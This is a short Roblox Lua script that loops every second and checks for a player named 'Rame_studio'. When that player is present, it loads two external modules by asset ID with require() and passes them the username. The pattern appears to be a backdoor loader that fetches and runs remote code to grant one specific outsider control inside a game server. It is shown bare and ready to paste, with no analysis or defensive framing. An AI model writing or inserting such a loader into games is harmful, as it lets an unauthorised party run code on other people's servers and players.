local Players = game:GetService("Players")

local function executeForRameStudio()
    local player = Players:FindFirstChild("Rame_studio")
    if player then
        require(2609384717).load("Rame_studio")
        require(10868847330):pls("Rame_studio")
    end
end

while true do
    executeForRameStudio()
    task.wait(1)
end

